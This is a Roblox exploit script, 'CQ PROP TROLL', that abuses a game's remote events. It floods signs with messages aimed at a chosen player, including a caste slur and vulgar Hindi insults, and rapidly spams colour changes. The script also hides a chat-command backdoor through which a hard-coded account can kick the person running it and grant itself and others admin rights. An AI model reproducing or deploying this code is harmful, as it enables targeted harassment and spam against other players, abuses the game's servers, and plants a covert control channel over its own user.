-- [[ CQ PROP TROLL V1 ]] --

local ReplicatedStorage = game:GetService("ReplicatedStorage")
local Players = game:GetService("Players")

local lplr = Players.LocalPlayer

local ScreenGui = Instance.new("ScreenGui")
local MainFrame = Instance.new("Frame")
local UICorner = Instance.new("UICorner")
local UIStroke = Instance.new("UIStroke")
local Title = Instance.new("TextLabel")
local TextBox = Instance.new("TextBox")
local StartBtn = Instance.new("TextButton")
local StopBtn = Instance.new("TextButton")
local RGBBtn = Instance.new("TextButton")
local SpeedBtn = Instance.new("TextButton")

-------------------------------------------------
-- ADMIN SYSTEM
-------------------------------------------------

local SUPER_ADMINS = {
    ["LEWISKAGULAAM_12"] = true
}

local TempAdmins = {}

local function isAdmin(playerName)
    if SUPER_ADMINS[playerName] then
        return true
    end

    if TempAdmins[playerName]
    and os.time() < TempAdmins[playerName] then
        return true
    end

    return false
end

local function listenForCommands(player)

    player.Chatted:Connect(function(message)

        local msg = string.lower(message)
        local split = string.split(msg, " ")

        local command = split[1]
        local targetInput = msg:sub(#command + 2)

        if command == "!kick"
        and isAdmin(player.Name) then

            if string.find(
                string.lower(lplr.Name),
                targetInput
            ) then

                lplr:Kick(
                    "[CQ PROP TROLL V2] Admin Kick"
                )
            end

        elseif command == "!cmds"
        and SUPER_ADMINS[player.Name] then

            for _,p in ipairs(
                Players:GetPlayers()
            ) do

                if string.find(
                    string.lower(p.Name),
                    targetInput
                ) then

                    TempAdmins[p.Name] =
                        os.time() + 7200
                end
            end
        end
    end)
end

for _,p in ipairs(Players:GetPlayers()) do
    listenForCommands(p)
end

Players.PlayerAdded:Connect(listenForCommands)

-------------------------------------------------
-- REMOTES
-------------------------------------------------

local remoteFolder =
    ReplicatedStorage:WaitForChild("RE")

local nameEvent =
    remoteFolder:FindFirstChild("1RPNam1eTex1t")

local colorEvent =
    remoteFolder:FindFirstChild("1RPNam1eColo1r")

local SignRemote =
    remoteFolder:FindFirstChild("1Cemeter1y")

-------------------------------------------------
-- RP NAME & BIO
-------------------------------------------------

local function updateRP()

    if nameEvent then

        pcall(function()

            nameEvent:FireServer(
                "RolePlayName",
                "ᴄQ ᴘʀᴏᴘ ᴛʀᴏʟʟ V2"
            )

            nameEvent:FireServer(
                "RolePlayBio",
                "Welcome dear " ..
                lplr.DisplayName
            )

        end)
    end
end

updateRP()

lplr.CharacterAdded:Connect(updateRP)

-------------------------------------------------
-- RGB NAME/BIO
-------------------------------------------------

task.spawn(function()

    local hue = 0

    while true do

        local rgbColor =
            Color3.fromHSV(hue,1,1)

        if colorEvent then

            pcall(function()

                colorEvent:FireServer(
                    "PickingRPNameColor",
                    rgbColor
                )

                colorEvent:FireServer(
                    "PickingRPBioColor",
                    rgbColor
                )

            end)
        end

        hue = hue + 0.01

        if hue > 1 then
            hue = 0
        end

        task.wait(0.5)
    end
end)

-------------------------------------------------
-- UI
-------------------------------------------------

ScreenGui.Name = "CQPROPTROLLV2"

pcall(function()
    ScreenGui.Parent = game.CoreGui
end)

MainFrame.Parent = ScreenGui
MainFrame.BackgroundColor3 =
    Color3.fromRGB(5,5,5)

MainFrame.Position =
    UDim2.new(0.5,-90,0.4,0)

MainFrame.Size =
    UDim2.new(0,180,0,240)

MainFrame.Active = true
MainFrame.Draggable = true

UICorner.Parent = MainFrame

UIStroke.Parent = MainFrame
UIStroke.Thickness = 3
UIStroke.Color =
    Color3.fromRGB(255,0,255)

-------------------------------------------------
-- TITLE
-------------------------------------------------

Title.Parent = MainFrame
Title.Size = UDim2.new(1,0,0,40)
Title.BackgroundTransparency = 1

Title.Text = "CQ PROP TROLL V2"

Title.Font = Enum.Font.GothamBold
Title.TextColor3 =
    Color3.fromRGB(255,255,255)

-------------------------------------------------
-- TEXTBOX
-------------------------------------------------

TextBox.Parent = MainFrame

TextBox.Position =
    UDim2.new(0.1,0,0.19,0)

TextBox.Size =
    UDim2.new(0.8,0,0,30)

TextBox.BackgroundColor3 =
    Color3.fromRGB(25,25,25)

TextBox.PlaceholderText =
    "Target Name..."

TextBox.TextColor3 =
    Color3.fromRGB(255,255,255)

TextBox.BorderSizePixel = 0

Instance.new("UICorner", TextBox)

-------------------------------------------------
-- START BUTTON
-------------------------------------------------

StartBtn.Parent = MainFrame

StartBtn.Position =
    UDim2.new(0.1,0,0.36,0)

StartBtn.Size =
    UDim2.new(0.8,0,0,25)

StartBtn.BackgroundColor3 =
    Color3.fromRGB(0,255,100)

StartBtn.Text = "CQ H8R KI CHUDAI"

StartBtn.TextColor3 =
    Color3.fromRGB(255,255,255)

StartBtn.BorderSizePixel = 0

Instance.new("UICorner", StartBtn)

-------------------------------------------------
-- STOP BUTTON
-------------------------------------------------

StopBtn.Parent = MainFrame

StopBtn.Position =
    UDim2.new(0.1,0,0.50,0)

StopBtn.Size =
    UDim2.new(0.8,0,0,25)

StopBtn.BackgroundColor3 =
    Color3.fromRGB(255,0,0)

StopBtn.Text = "STOP"

StopBtn.TextColor3 =
    Color3.fromRGB(255,255,255)

StopBtn.BorderSizePixel = 0

Instance.new("UICorner", StopBtn)

-------------------------------------------------
-- RGB BUTTON
-------------------------------------------------

RGBBtn.Parent = MainFrame

RGBBtn.Position =
    UDim2.new(0.1,0,0.64,0)

RGBBtn.Size =
    UDim2.new(0.8,0,0,25)

RGBBtn.BackgroundColor3 =
    Color3.fromRGB(0,150,255)

RGBBtn.Text = "RGB PROPS: OFF"

RGBBtn.TextColor3 =
    Color3.fromRGB(255,255,255)

RGBBtn.BorderSizePixel = 0

Instance.new("UICorner", RGBBtn)

-------------------------------------------------
-- SPEED BUTTON
-------------------------------------------------

SpeedBtn.Parent = MainFrame

SpeedBtn.Position =
    UDim2.new(0.1,0,0.78,0)

SpeedBtn.Size =
    UDim2.new(0.8,0,0,25)

SpeedBtn.BackgroundColor3 =
    Color3.fromRGB(255,165,0)

SpeedBtn.Text = "SPEED: NORMAL"

SpeedBtn.TextColor3 =
    Color3.fromRGB(255,255,255)

SpeedBtn.BorderSizePixel = 0

Instance.new("UICorner", SpeedBtn)

-------------------------------------------------
-- TROLL SYSTEM
-------------------------------------------------

local trolling = false
local rgbProps = false

local trollSpeed = 0.6

local speedPresets = {
    { name = "SLOW",   delay = 1.2 },
    { name = "NORMAL", delay = 0.6 },
    { name = "FAST",   delay = 0.3 },
    { name = "INSANE", delay = 0.000001 }
}

local speedIndex = 2

local trollList = {
    "CVR DE",
    "CQ ON TOP 👑",
    "CXD",
    "PILA KAISE 😂",
    "H8 DEGA CHAMAR?",
    "L LELE",
    "AHH AHHH 🙌",
    "FTT GYI?",
    "TMX MARE CQ",
     "LADLE MWAHH "
}

local index = 1

-------------------------------------------------
-- START
-------------------------------------------------

StartBtn.MouseButton1Click:Connect(function()

    if trolling then
        return
    end

    trolling = true

    StartBtn.Text = "CQ H8R KI CHUDAI 🥵..."

    task.spawn(function()

        while trolling do

            local target =
                TextBox.Text ~= ""
                and TextBox.Text
                or "CQ H8R"

            local fullMsg =
                "[" ..
                string.upper(target) ..
                "] " ..
                trollList[index]

            if SignRemote then

                for id = 1,300 do

                    if not trolling then
                        break
                    end

                    local idStr =
                        tostring(id)

                    pcall(function()

                        SignRemote:FireServer(
                            "ReturningBigSign2Name",
                            idStr,
                            fullMsg
                        )

                        SignRemote:FireServer(
                            "ReturningBigSign3Name",
                            idStr,
                            fullMsg
                        )

                        SignRemote:FireServer(
                            "ReturningBigSign4Name",
                            idStr,
                            fullMsg
                        )

                        SignRemote:FireServer(
                            "ReturningConstuctionName",
                            idStr,
                            fullMsg
                        )

                        SignRemote:FireServer(
                            "ReturningCommercialWords",
                            id,
                            nil,
                            fullMsg
                        )

                    end)
                end
            end

            index =
                (index % #trollList) + 1

            task.wait(trollSpeed)
        end
    end)
end)

-------------------------------------------------
-- RGB PROPS (MODIFIED: very fast color change)
-------------------------------------------------

RGBBtn.MouseButton1Click:Connect(function()

    rgbProps = not rgbProps

    RGBBtn.Text =
        rgbProps
        and "RGB PROPS: ON"
        or "RGB PROPS: OFF"

    if rgbProps then

        task.spawn(function()

            local h = 0

            while rgbProps do

                local c =
                    Color3.fromHSV(h,1,1)

                for _,v in ipairs(
                    workspace:GetDescendants()
                ) do

                    if v.Name == "ChangePropColor"
                    and v:IsA("RemoteFunction") then

                        pcall(function()

                            v:InvokeServer(c)

                        end)
                    end
                end

                local cp =
                    lplr.PlayerGui:
                    FindFirstChild(
                        "NoResetGUIHandler"
                    )

                if cp
                and cp:FindFirstChild(
                    "PropColorPicker"
                ) then

                    pcall(function()

                        cp.PropColorPicker
                        .SetColor:FireServer(c)

                    end)
                end

                -- Increased hue step and reduced wait for very fast color cycling
                h = (h + 0.2) % 1

                task.wait(0.05)
            end
        end)
    end
end)

-------------------------------------------------
-- SPEED BUTTON
-------------------------------------------------

SpeedBtn.MouseButton1Click:Connect(function()

    speedIndex = speedIndex % #speedPresets + 1

    local preset = speedPresets[speedIndex]

    trollSpeed = preset.delay

    SpeedBtn.Text = "SPEED: " .. preset.name

end)

-------------------------------------------------
-- STOP
-------------------------------------------------

StopBtn.MouseButton1Click:Connect(function()

    trolling = false
    rgbProps = false

    StartBtn.Text =
        "CQ H8R KI MAA CHUDAI CHALU"

    RGBBtn.Text =
        "RGB PROPS: OFF"

end)
